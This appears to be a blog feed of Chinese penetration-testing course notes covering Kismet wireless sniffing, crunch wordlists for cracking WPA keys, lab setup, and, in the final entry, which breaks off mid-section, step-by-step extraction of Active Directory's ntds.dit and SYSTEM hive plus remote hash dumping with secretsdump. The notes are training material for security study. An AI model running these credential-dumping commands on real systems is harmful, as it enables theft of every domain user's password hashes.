        <content type="html"><![CDATA[<h1 id="熟悉kismet"><a href="#熟悉kismet" class="headerlink" title="熟悉kismet"></a>熟悉kismet</h1><p>如果要进行无线网络渗透测试，则必须先扫描所有有效的无线接入点。刚好在Kali Linux中，提供了一款嗅探无线网络工具<strong>Kismet</strong>。使用该工具可以测量周围的无线信号，并查看所有可用的无线接入点。本节课将介绍使用Kismet工具嗅探无线网络。</p><h2 id="1-软件介绍"><a href="#1-软件介绍" class="headerlink" title="1.软件介绍"></a>1.软件介绍</h2><p>Kismet是802.11二层无线网络探测器，嗅探器和入侵检测系统。它将与支持原始监视（rfmon）模式中的任何无线网卡的工作，并能嗅出的802.11a / b / g / n的流量。它可以使用其他程序来播放音频警报网络事件，读出网络摘要，或提供GPS坐标。这是包含芯，客户端和服务器的主包。</p><h2 id="2-软件使用"><a href="#2-软件使用" class="headerlink" title="2.软件使用"></a>2.软件使用</h2><h4 id="1-查看kali是否链接了无线网卡"><a href="#1-查看kali是否链接了无线网卡" class="headerlink" title="1.查看kali是否链接了无线网卡"></a>1.查看kali是否链接了无线网卡</h4><pre class="line-numbers language-none"><code class="language-none">ip a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-启动kismet"><a href="#2-启动kismet" class="headerlink" title="2.启动kismet"></a>2.启动kismet</h4><p>github地址:<a href="https://github.com/kismetwireless/kismet">https://github.com/kismetwireless/kismet</a></p><pre class="line-numbers language-none"><code class="language-none">kismet -c wlan0 --use-gpsd-gps-c：指定监听的网卡--use-gpsd-gps： 在主机端口使用GPSD控制的GPS（默认值：localhost：2947）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="3-查看此时的网卡配置"><a href="#3-查看此时的网卡配置" class="headerlink" title="3.查看此时的网卡配置"></a>3.查看此时的网卡配置</h4><pre class="line-numbers language-none"><code class="language-none">ip awlan0mon：虚拟无线网卡适配器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="4-访问kismet管理界面"><a href="#4-访问kismet管理界面" class="headerlink" title="4.访问kismet管理界面"></a>4.访问kismet管理界面</h4><pre class="line-numbers language-none"><code class="language-none">http://192.168.70.3:2501/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="5-打开图形窗口，第一次使用时，将会进入用户信息设置界面，如下图："><a href="#5-打开图形窗口，第一次使用时，将会进入用户信息设置界面，如下图：" class="headerlink" title="5.打开图形窗口，第一次使用时，将会进入用户信息设置界面，如下图："></a>5.打开图形窗口，第一次使用时，将会进入用户信息设置界面，如下图：</h4><p><img src="images/image-20211104112357836.png" alt="image-20211104112357836"></p><pre class="line-numbers language-none"><code class="language-none">User name:guoyxPassword:guoyxConfirm:guoyx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="6-填写相关用户信息，第一行用户名，第二行密码，第三行重复密码，设置完成，点击save（保存）。弹出如下界面"><a href="#6-填写相关用户信息，第一行用户名，第二行密码，第三行重复密码，设置完成，点击save（保存）。弹出如下界面" class="headerlink" title="6.填写相关用户信息，第一行用户名，第二行密码，第三行重复密码，设置完成，点击save（保存）。弹出如下界面"></a>6.填写相关用户信息，第一行用户名，第二行密码，第三行重复密码，设置完成，点击save（保存）。弹出如下界面</h4><p><img src="images/image-20211104112428884.png" alt="image-20211104112428884"></p><p>QBSS：</p><p>这个QBSS概念是包含在802.11E之中，在和终端适配的时候 通知终端自己AP当前的负载能力，可以让（支持QBSS）的终端能够灵活选择最低负载的AP。</p><h2 id="3-课堂小结"><a href="#3-课堂小结" class="headerlink" title="3.课堂小结"></a>3.课堂小结</h2><p>参考：课后笔记</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/30-wu-xian-wifi-an-quan/wifi02-zhuan-shu-zi-dian-da-zao/di-2-zhang-zhuan-yong-zi-dian-da-zao/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/30-wu-xian-wifi-an-quan/wifi02-zhuan-shu-zi-dian-da-zao/di-2-zhang-zhuan-yong-zi-dian-da-zao/</url>
      
        <content type="html"><![CDATA[<h1 id="专用字典打造"><a href="#专用字典打造" class="headerlink" title="专用字典打造"></a>专用字典打造</h1><p>为什么在破解之前先准备专用字典，因为对于一般家庭来说无 常用 一个是预共享密钥PSK，一个是PIN码。</p><p>也不是所有的路由都开起了PIN码，一般都会开启域共享密钥。</p><h2 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h2><h3 id="1-预共享密钥模式"><a href="#1-预共享密钥模式" class="headerlink" title="1.预共享密钥模式"></a>1.预共享<a href="https://baike.baidu.com/item/%E5%AF%86%E9%92%A5">密钥</a>模式</h3><p>预共享<a href="https://baike.baidu.com/item/%E5%AF%86%E9%92%A5">密钥</a>模式（pre-shared key，PSK， 又称为个人模式）是设计给负担不起 802.1X 验证服务器的成本和复杂度的家庭和小型公司网络用的，每一个使用者必须输入密语来取用网络，而密语可以是 8 到 63 个<a href="https://baike.baidu.com/item/ASCII">ASCII</a>字符、或是 64 个16位数字（256位元）。使用者可以自行斟酌要不要把密语存在电脑里以省去重复键入的麻烦，但密语一定要存在 Wi-Fi 取用点里。</p><h3 id="2-pin码"><a href="#2-pin码" class="headerlink" title="2.pin码"></a>2.pin码</h3><p>PIN码(PIN1)-全称Personal Identification Number，就是SIM卡的个人识别密码。</p><p>路由器的pin码是qss（WPS功能）快速连接功能的识别码。<br>比如你设置个非常复杂的无线密码，每次有设备加入无线网络的时候，输入密码是很麻烦的。这个时候就可以通过输入8位的pin码，路由器识别后就允许加入网络了，相当于输入了无线密码。</p><p>Pin码为8位数的数字组合，一共为11000个，分为前半段4位10000个，后半段3位1000个（最后一位没用），所有只用3位来排列，就只有1000个，一共就是10000+1000=110000。</p><h2 id="2-字典"><a href="#2-字典" class="headerlink" title="2.字典"></a>2.字典</h2><p>想要破解预共享密钥，就需要一个靠谱的字典。字典是非常关键的。有一个靠谱的字典：</p><p>1.决定你是否可以破解成功</p><p>2.决定了花费时间的多少</p><h3 id="1-社会工程学字典生成器"><a href="#1-社会工程学字典生成器" class="headerlink" title="1.社会工程学字典生成器"></a>1.社会工程学字典生成器</h3><h4 id="1-亦思社会工程学字典生成器"><a href="#1-亦思社会工程学字典生成器" class="headerlink" title="1.亦思社会工程学字典生成器"></a>1.亦思社会工程学字典生成器</h4><p><img src="images/image-20211103102340354.png" alt="image-20211103102340354"></p><h4 id="2-真空密码生成器"><a href="#2-真空密码生成器" class="headerlink" title="2.真空密码生成器"></a>2.真空密码生成器</h4><p><img src="images/image-20211103102435734.png" alt="image-20211103102435734"></p><h4 id="3-safe6pwd-jar密码生成器"><a href="#3-safe6pwd-jar密码生成器" class="headerlink" title="3.safe6pwd.jar密码生成器"></a>3.safe6pwd.jar密码生成器</h4><p><img src="images/image-20211103102527881.png" alt="image-20211103102527881"></p><h4 id="4-Crunch工具（kali）"><a href="#4-Crunch工具（kali）" class="headerlink" title="4.Crunch工具（kali）"></a>4.Crunch工具（kali）</h4><h5 id="1-工具介绍"><a href="#1-工具介绍" class="headerlink" title="1.工具介绍"></a>1.工具介绍</h5><p>Crunch can create a wordlist based on criteria you specify.  The output from crunch can be sent to the screen, file, or to another program.</p><p>Crunch[krʌntʃ]可以根据您指定的条件创建单词列表。crunch的输出可以发送到屏幕、文件或其他程序。</p><h5 id="2-命令行介绍"><a href="#2-命令行介绍" class="headerlink" title="2.命令行介绍"></a>2.命令行介绍</h5><pre class="line-numbers language-none"><code class="language-none">crunch &lt;min&gt; &lt;max&gt; [options]min：最小长度max：最大长度options：其他选项crunch 最短长度 最长长度 字符集 选项字符集:cat /usr/share/crunch/charset.lsteg:crunch 2 2 -o pwd.txtcrunch 2 2 -f /usr/share/crunch/charset.lst lalpha-sv -o c.txtcrunch 2 2 -f /usr/share/crunch/charset.lst lalpha-numeric-symbol14-sv -o a.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="3-生成密码字典命令"><a href="#3-生成密码字典命令" class="headerlink" title="3.生成密码字典命令"></a>3.生成密码字典命令</h5><pre class="line-numbers language-none"><code class="language-none">crunch 8 12 -f /usr/share/crunch/charset.lst ualpha -o /root/pass.txt-f：规则文件位置ualpha：具体的规则-o：文件输出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-准备好的字典"><a href="#2-准备好的字典" class="headerlink" title="2.准备好的字典"></a>2.准备好的字典</h3><p>1.大字典 7.66G</p><p>2.千万常用密码(删减纯数字后).txt</p><h2 id="3-课堂小结"><a href="#3-课堂小结" class="headerlink" title="3.课堂小结"></a>3.课堂小结</h2><p>参考：课后笔记</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/30-wu-xian-wifi-an-quan/wifi01-huan-jing-zhun-bei/di-1-zhang-wu-xian-an-quan-huan-jing-da-jian/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/30-wu-xian-wifi-an-quan/wifi01-huan-jing-zhun-bei/di-1-zhang-wu-xian-an-quan-huan-jing-da-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="无线安全环境搭建"><a href="#无线安全环境搭建" class="headerlink" title="无线安全环境搭建"></a>无线安全环境搭建</h1><h2 id="1-802-11标准"><a href="#1-802-11标准" class="headerlink" title="1.802.11标准"></a>1.802.11标准</h2><h3 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h3><p>802.11标准是1997年IEEE最初制定的一个WLAN标准，工作在2.4GHz开放频段，支持1Mbit/s和2Mbit/s的数据传输速率，定义了物理层和MAC层规范，允许无线局域网及无线设备制造商建立互操作网络设备。基于IEEE802.11系列的WLAN标准已包括共21个标准，其中802.11a、802.11b和802.11g最具代表性.</p><p>简单来说：IEEE提出的，是工作在数据链路层的无线协议。</p><h3 id="2-802-11标准和补充"><a href="#2-802-11标准和补充" class="headerlink" title="2. 802.11标准和补充"></a>2. 802.11标准和补充</h3><p>802.11 ,1997年,原始标准(2Mbit/s,2.4GHZ频道)。  </p><p>802.11a,1999年,物理层补充(54Mbit/s,5GHz频道)。  </p><p>802.11b,1999年,物理层补充(11Mbit/s,2.4GHZ频道)。  </p><p>802.11c,符合802.1D的媒体接入控制层(MAC)桥接(MAC Layer Bridging)。  </p><p>802.11d,根据各国无线电规定做的调整。　 </p><p>802.11e ,对服务等级(Quality of Service, QoS)的支持。  </p><p>802.11f,基站的互连性(Interoperability)。  </p><p>802.11g,物理层补充(54Mbit/s,2.4GHZ频道)。  </p><p>802.11h,无线覆盖半径的调整,室内(indoor)和室外(outdoor)信道(5GHz频段)。  </p><p>802.11i,安全和鉴权(Authentification)方面的补充。  </p><p>802.11n,导入多重输入输出(MIMO)和40Mbit信道宽度(HT40)技术,基本上是802.11a/g的延伸版。</p><h2 id="2-WiFi标准"><a href="#2-WiFi标准" class="headerlink" title="2.WiFi标准"></a>2.WiFi标准</h2><p>是由wifi联盟提出的一个802.11标准的一个子集，wifi联盟保证了各种不同的无线产品能一起工作。</p><p>目前wifi主流应用的协议</p><p><img src=".%5Cassets%5C802-11.png" alt="802-11"></p><h2 id="3-无线接入点AP-Access-Point"><a href="#3-无线接入点AP-Access-Point" class="headerlink" title="3.无线接入点AP(Access Point)"></a>3.无线接入点AP(Access Point)</h2><h3 id="1-概念-1"><a href="#1-概念-1" class="headerlink" title="1.概念"></a>1.概念</h3><p>无线AP（Access Point）：即无线接入点，它用于无线网络的无线交换机，也是无线网络的核心。无线AP是移动计算机用户进入有线网络的接入点，主要用于宽带家庭、大楼内部以及园区内部，可以覆盖几十米至上百米。无线AP（又称会话点或存取桥接器）是一个包含很广的名称，它不仅包含单纯性无线接入点（无线AP），同样也是无线路由器（含无线网关、无线网桥）等类设备的统称。</p><h3 id="2-AP的分类"><a href="#2-AP的分类" class="headerlink" title="2.AP的分类"></a>2.AP的分类</h3><p>无线AP通常可以分为胖AP（Fat AP）和瘦AP（Fit AP）两类，不是以外观来分辨的，而是从其工作原理和功能上来区分。当然，部分胖、瘦AP在外观上确实能分辨，比如有WAN口的一定是胖AP。 </p><h4 id="1-胖AP"><a href="#1-胖AP" class="headerlink" title="1.胖AP"></a>1.胖AP</h4><p>胖AP除了前面提到的无线接入功能外，一般还同时具备WAN、LAN端口，支持DHCP服务器、DNS和MAC地址克隆、VPN接入、防火墙等安全功能。胖AP通常有自带的完整操作系统，是可以独立工作的网络设备，可以实现拨号、路由等功能，一个典型的例子就是我们常见的无线路由器。</p><p>胖AP简单理解就是带管理功能的AP，胖AP就是自己带有管理功能同时又广播SSID还连接终端的AP，属于麻雀虽小 五脏俱全类型的。 </p><p><img src=".%5Cassets%5C%E8%83%96AP%E6%88%96%E8%80%85%E8%B7%AF%E7%94%B1.png" alt="胖AP或者路由"></p><h4 id="2-瘦AP"><a href="#2-瘦AP" class="headerlink" title="2.瘦AP"></a>2.瘦AP</h4><p>痩AP则是不带管理功能的，简单可以把它理解为一个信号发送与接收的天线，它的管理功能由后端的，我们叫无线控制器（AC)来完成。</p><p>瘦AP就不能自管理了，需要AC来管理，瘦AP只负责广播SSID和连接终端；一般超小规模组网用胖AP，稍微大一点就用瘦AP了。</p><p>这么做的原因主要是在无线路由器很多的情况下，大企业部署一个园区的无线覆盖，有几百个无线路由器是很正常的，但是管理起来就很麻烦了，总不可能像家用路由器一个一个去配置吧，所有由AC进行统一管理要方便和高效的多。</p><p><img src=".%5Cassets%5C%E7%98%A6AP.png" alt="瘦AP"></p><h4 id="3-用途的区别"><a href="#3-用途的区别" class="headerlink" title="3.用途的区别"></a>3.用途的区别</h4><p>胖AP：类似于家用无线路由器，具有三层路由功能.( 多用于家庭)</p><p>瘦AP：仅仅类似于以太网集线器，用于转换电信号和无线信号（多用于企业）</p><h2 id="4-客户端-STA"><a href="#4-客户端-STA" class="headerlink" title="4.客户端 STA"></a>4.客户端 STA</h2><p>连接到AP或者路由器上的设备，就叫做这个AP或者路由器的客户端。比如说 手机，电脑等等</p><h2 id="5-无线局域网AP术语介绍"><a href="#5-无线局域网AP术语介绍" class="headerlink" title="5.无线局域网AP术语介绍"></a>5.无线局域网AP术语介绍</h2><p><strong>SSID</strong>： 服务集标识即wifi名称</p><p><strong>BSSID</strong>：AP的2层地址（AP的MAC地址）</p><p><strong>ESSID</strong>：扩展服务集标识，一般情况下等同于SSID。当同一家公司的多个AP组成了一个网络时，整个网络名称就是ESSID。他下边所有AP的名字都是相同的。</p><p><strong>工作模式</strong>：802.11 b/g/n/  a/n/ac(5G)  向下兼容</p><p><strong>信道（channel）</strong>：发送方和接收方期望载波的频率是固定的，并在特殊性定的范围内变化，这种范围称为信道，WLAN信道是由当前使用的802.11标准决定的。</p><p><img src=".%5Cassets%5C%E4%BF%A1%E9%81%93.png" alt="信道"></p><h2 id="6-无线网卡的工作模式"><a href="#6-无线网卡的工作模式" class="headerlink" title="6.无线网卡的工作模式"></a>6.无线网卡的工作模式</h2><h3 id="1-Managed-Mode"><a href="#1-Managed-Mode" class="headerlink" title="1.Managed Mode"></a>1.Managed Mode</h3><p>被管理模式(Managed mode)：当你的无线客户端直接与无线接入点（Wireless Access Point，WAP）连接时，就使用这个模式。在这个模式中，无线网卡的驱动程序依赖WAP管理整个通信过程。</p><p><img src=".%5Cassets%5C%E8%A2%AB%E7%AE%A1%E7%90%86%E6%A8%A1%E5%BC%8F.png" alt="被管理模式"></p><h3 id="2-Ad-Hoc"><a href="#2-Ad-Hoc" class="headerlink" title="2.Ad Hoc"></a>2.Ad Hoc</h3><p>当你的网络由互相直连的设备组成时，就使用这个模式。在这个模式中，无线通信双方共同承担WAP的职责。</p><p><img src=".%5Cassets%5Cad-hoc%E6%A8%A1%E5%BC%8F.png" alt="ad-hoc模式"></p><h3 id="3-Master-Mode"><a href="#3-Master-Mode" class="headerlink" title="3.Master Mode"></a>3.Master Mode</h3><p>一些高端无线网卡还支持主模式。这个模式允许无线网卡使用特制的驱动程序和软件工作，作为其他设备的WAP。比如说猎豹免费wifi </p><p><img src=".%5Cassets%5C%E4%B8%BB%E6%A8%A1%E5%BC%8F.png" alt="主模式"></p><h3 id="4-Monitor-Mode"><a href="#4-Monitor-Mode" class="headerlink" title="4.Monitor Mode"></a>4.Monitor Mode</h3><p>就我们的用途而言，这是最重要的模式。当你希望无线客户端停止收发数据，专心监听空气中的数据包时，就使用监听模式。要使Wireshark捕获无线数据包，你的无线网卡和配套驱动程序必须支持监听模式（也叫RFMON模式）</p><p><img src=".%5Cassets%5C%E7%9B%91%E5%90%AC%E6%A8%A1%E5%BC%8F.png" alt="监听模式"></p><h2 id="5-无线渗透的环境搭建"><a href="#5-无线渗透的环境搭建" class="headerlink" title="5.无线渗透的环境搭建"></a>5.无线渗透的环境搭建</h2><h3 id="1-kali-linux"><a href="#1-kali-linux" class="headerlink" title="1.kali linux"></a>1.kali linux</h3><p>​下载安装kali虚拟机</p><p>​ 官网：<a href="https://www.kali.org/">https://www.kali.org/</a></p><h3 id="2-usb的网卡"><a href="#2-usb的网卡" class="headerlink" title="2.usb的网卡"></a>2.usb的网卡</h3><p>​推荐使用 RTL8187 ，RT3070或者WiFi联盟的 kali内置了驱动，被无线安全的人广泛使用。 </p><h3 id="3-设置无线网卡连接到虚拟机"><a href="#3-设置无线网卡连接到虚拟机" class="headerlink" title="3.设置无线网卡连接到虚拟机"></a>3.设置无线网卡连接到虚拟机</h3><p>1.我的电脑–右键–管理–服务和应用程序–服务–VMUSBArbService 选择启动</p><p><img src=".%5Cassets%5C%E5%90%AF%E5%8A%A8%E8%99%9A%E6%8B%9F%E6%9C%BAusb%E6%9C%8D%E5%8A%A1.png" alt="启动虚拟机usb服务"></p><p>2.启动卡里虚拟机–插入usb网卡</p><p>3.虚拟机–可移动设备–选择无线网卡–选择链接（断开于主机的链接）</p><p>4.输入ip a  查看网卡是否被识别</p><p><img src=".%5Cassets%5C%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%E7%A1%AE%E8%AE%A4.png" alt="无线网卡确认"></p><pre class="line-numbers language-none"><code class="language-none">如果状态是down，执行：ifconfig eth2 up如果一直down状态，多重连几次<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6-课堂小结"><a href="#6-课堂小结" class="headerlink" title="6.课堂小结"></a>6.课堂小结</h2><p>参考：无线安全环境搭建-课后笔记.xmind</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/29-nei-wang-shen-tou/di-5-zhang-yu-kong-an-quan-he-kua-yu-gong-ji/di-5-zhang-yu-kong-an-quan-he-kua-yu-gong-ji/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/29-nei-wang-shen-tou/di-5-zhang-yu-kong-an-quan-he-kua-yu-gong-ji/di-5-zhang-yu-kong-an-quan-he-kua-yu-gong-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="ntds-dit文件的介绍"><a href="#ntds-dit文件的介绍" class="headerlink" title="ntds.dit文件的介绍"></a>ntds.dit文件的介绍</h1><h2 id="Ntds-dit介绍"><a href="#Ntds-dit介绍" class="headerlink" title="Ntds.dit介绍"></a>Ntds.dit介绍</h2><p>ntds.dit为<strong>ad</strong>的数据库，内容有域用户、域组、用户hash等信息，域控上的ntds dit只有可以登录到域控的用户(如域管用户、DC本地管理员用户)可以访问。<strong>ntds.dit</strong>包括三个主要表: <strong>数据表、链接表、 sd表</strong>。所以只要在域渗透中能够获取到ntds.dit就可以获取到所有域用户的用户名和对应的hash,它和SAM文件一样， 被windows系统锁死</p><h2 id="Ntds-dit位置"><a href="#Ntds-dit位置" class="headerlink" title="Ntds.dit位置"></a>Ntds.dit位置</h2><pre class="line-numbers language-none"><code class="language-none">C:\windows\NTDS<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230410162525893.png" alt="image-20230410162525893"></p><h1 id="多种方式提取和移动ntds-dit文件"><a href="#多种方式提取和移动ntds-dit文件" class="headerlink" title="多种方式提取和移动ntds.dit文件"></a>多种方式提取和移动ntds.dit文件</h1><h2 id="ntdsutils-exe提取ntds-dit"><a href="#ntdsutils-exe提取ntds-dit" class="headerlink" title="ntdsutils.exe提取ntds.dit"></a>ntdsutils.exe提取ntds.dit</h2><p><code>ntdsutils.exe</code>是-一个为活动目录提供管理机制的命令行工具，使用<code>ntdsutils. exe</code>可以维护和管理活动目录数<br>据库、控制单个主机操作、创建应用程序目录分区等，该工具默认安装在<strong>域控服务器</strong>上，可以在域控制器上直接操<br>作，支持windows server 2003、2008、 2012. 提取过程分为3步:</p><h3 id="第一步-创建快照"><a href="#第一步-创建快照" class="headerlink" title="第一步:创建快照"></a>第一步:创建快照</h3><pre class="line-numbers language-none"><code class="language-none">ntdsutil.exe snapshot "activate instance ntds" create q q <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到快照的uid是<code>ba67006b-cf90-46fd-a792-fabd54e3790e</code></p><p><img src="assets/image-20230410162855869.png" alt="image-20230410162855869"></p><pre class="line-numbers language-none"><code class="language-none">如果报错：错误 0x80042302(卷影复制服务组件遇到了意外错误。请检查应用程序事件日志以了解详细信息。)卷影复制服务错误：则在服务中启动“Volume Shadow Copy”服务，并改为”自动”更改系统还原设置：1.在 “运行”中输入“gpedit.msc”。2. 转到“计算机配置”\“管理模板”\“系统”\“系统还原”。3. 双击右侧的“关闭系统还原”并将其设置为“未配置”。在电脑上运行系统文件检查器（SFC）：1. 以管理员身份运行CMD。2. 输入“sfc /scannow”。3. 等待完成后，查看问题是否解决。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="第二步-加载快照"><a href="#第二步-加载快照" class="headerlink" title="第二步:加载快照"></a>第二步:加载快照</h3><pre class="line-numbers language-none"><code class="language-none">ntdsutil.exe snapshot "mount {ba67006b-cf90-46fd-a792-fabd54e3790e}" q q <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230410162931059.png" alt="image-20230410162931059"></p><p>可以看到快照的地址为<code>C:\$SNAP_202304101656_VOLUMEC$\</code></p><h3 id="第三步-复制快照中的ntds-dit文件"><a href="#第三步-复制快照中的ntds-dit文件" class="headerlink" title="第三步:复制快照中的ntds.dit文件"></a>第三步:复制快照中的ntds.dit文件</h3><pre class="line-numbers language-none"><code class="language-none">copy '快照地址\windows\NTDS\ntds.dit' 目标地址eg:copy C:\$SNAP_202304101656_VOLUMEC$\Windows\NTDS\ntds.dit C:\Users\Administrator\desktop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="第四步-删除快照"><a href="#第四步-删除快照" class="headerlink" title="第四步:删除快照"></a>第四步:删除快照</h3><pre class="line-numbers language-none"><code class="language-none">ntdsutil.exe snapshot "umount {ba67006b-cf90-46fd-a792-fabd54e3790e}" "delete {ba67006b-cf90-46fd-a792-fabd54e3790e}" q q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="vssadmin提取ntds-dit"><a href="#vssadmin提取ntds-dit" class="headerlink" title="vssadmin提取ntds.dit"></a>vssadmin提取ntds.dit</h2><p>vssadmin1是Windows Server 2008及Windows 7系统提供的VSS管理工具，它可以用于创建或删除卷影副本,<br>列出卷影副本的信息(只能管理系统Provider创建的卷影副本)。还可以用于显示所有安装的所有卷影副本写入程<br>序(writers) 和提供程序(providers) ，以及改变卷影副本存储空间(即所谓的”diff空间”)的大小等。支持的操<br>作系统: Server 2008、Server 2012</p><h3 id="第一步-创建快照-1"><a href="#第一步-创建快照-1" class="headerlink" title="第一步:创建快照."></a>第一步:创建快照.</h3><pre class="line-numbers language-none"><code class="language-none">vssadmin create shadow /for=C:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>521e9314-3be7-4342-98d2-be7f744ae031</code></p><p> <code>\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2 </code></p><p><img src="assets/image-20230410172211914.png" alt="image-20230410172211914"></p><h3 id="第二步-复制文件"><a href="#第二步-复制文件" class="headerlink" title="第二步:复制文件"></a>第二步:复制文件</h3><pre class="line-numbers language-none"><code class="language-none">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\NTDS\ntds.dit C:\users\Administrator\Desktop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230410172410979.png" alt="image-20230410172410979"></p><h3 id="第三步-删除快照"><a href="#第三步-删除快照" class="headerlink" title="第三步:删除快照"></a>第三步:删除快照</h3><pre class="line-numbers language-none"><code class="language-none">vssadmin delete shadows /for=c: /quiet<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230410181304076.png" alt="image-20230410181304076"></p><h2 id="vssown提取ntds-dit"><a href="#vssown提取ntds-dit" class="headerlink" title="vssown提取ntds.dit"></a>vssown提取ntds.dit</h2><p>vssown.vbs和vssadmin类似，它是由Tim Tomes开发完成的，它可以创建和删除卷影副本，以及启动和停止卷影复制服务</p><p>github链接:<a href="https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vbs">https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vbs</a></p><h3 id="第一步-启动卷影复制服务"><a href="#第一步-启动卷影复制服务" class="headerlink" title="第一步:启动卷影复制服务"></a>第一步:启动卷影复制服务</h3><pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs /start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="第二步-创建一个C盘的卷影副本"><a href="#第二步-创建一个C盘的卷影副本" class="headerlink" title="第二步:创建一个C盘的卷影副本"></a>第二步:创建一个C盘的卷影副本</h3><pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs /create c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="第三步-列出当前卷影副本"><a href="#第三步-列出当前卷影副本" class="headerlink" title="第三步:列出当前卷影副本"></a>第三步:列出当前卷影副本</h3><pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs /list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230410183139315.png" alt="image-20230410183139315"></p><h3 id="第四步-复制文件"><a href="#第四步-复制文件" class="headerlink" title="第四步:复制文件:"></a>第四步:复制文件:</h3><pre class="line-numbers language-none"><code class="language-none">copy \\?\GLOBALROOT\Device\HarddiskvolumeShadowCopy3\windows\NTDS\ntds.dit C:\users\Administrator\Desktop\ntds\ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="第五步-删除卷影副本"><a href="#第五步-删除卷影副本" class="headerlink" title="第五步:删除卷影副本"></a>第五步:删除卷影副本</h3><pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs /delete {81571CDB-A5CA-4365-BDD1-286754941D24}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="IFM"><a href="#IFM" class="headerlink" title="IFM"></a>IFM</h2><p>可以通过创建一个IFM的方式获取ntds.dit,在使用ntdsutil创建媒体安装集(IFM) 时，需要进行生成快照、加<br>载、将ntds.dit 和计算机的SAM文件复制到目标文件夹中等操作，这些操作也可以通过PowerShell或VMI远程<br>执行。</p><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步:"></a>第一步:</h3><pre class="line-numbers language-none"><code class="language-none">ntdsutil "ac i ntds" "ifm" "create full C:/test" q q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时ntds.dit将被保存在<code>C:\test\Active Directory</code> 下, </p><p>SYSTEN 和SECURITY两个文件将被保存在<code>C:\test\registry</code>文件夹下</p><p><img src="assets/image-20230410195515722.png" alt="image-20230410195515722"></p><h3 id="第二步-删除"><a href="#第二步-删除" class="headerlink" title="第二步:删除"></a>第二步:删除</h3><pre class="line-numbers language-none"><code class="language-none">rmdir /s/q C:\test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="impacket"><a href="#impacket" class="headerlink" title="impacket"></a>impacket</h2><p>通过<strong>impacket</strong>里的<strong>secretsdump.py</strong>脚本可以直接远程读取ntds.dit 并导出哈希值</p><pre class="line-numbers language-none"><code class="language-none">secretsdump.exe 域名/administrator:密码@IP -outputfile output_ntdseg:secretsdump.exe hack.com/administrator:123456kl;'@192.168.70.16 -outputfile output_ntds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="离线方式读取ntds-dit文件"><a href="#离线方式读取ntds-dit文件" class="headerlink" title="离线方式读取ntds.dit文件"></a>离线方式读取ntds.dit文件</h1><p>离线一般需要两步:</p><ol><li>将远端域控的ntds.dit下载到本地，</li><li>然后利用再在本地进行。</li></ol><p>注意:因为<strong>system.hive</strong>里存放着ntds.dit的<strong>秘钥</strong>，所以需要转储system.hive，不然没法查看ntds.dit里内容</p><p>命令如下: .</p><pre class="line-numbers language-none"><code class="language-none">reg save hklm\system C:\system.hive<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下面介绍几种方式离线读取ntds.dit文件</p><h2 id="esedbexport"><a href="#esedbexport" class="headerlink" title="esedbexport"></a>esedbexport</h2><p><strong>取证工具</strong></p><h3 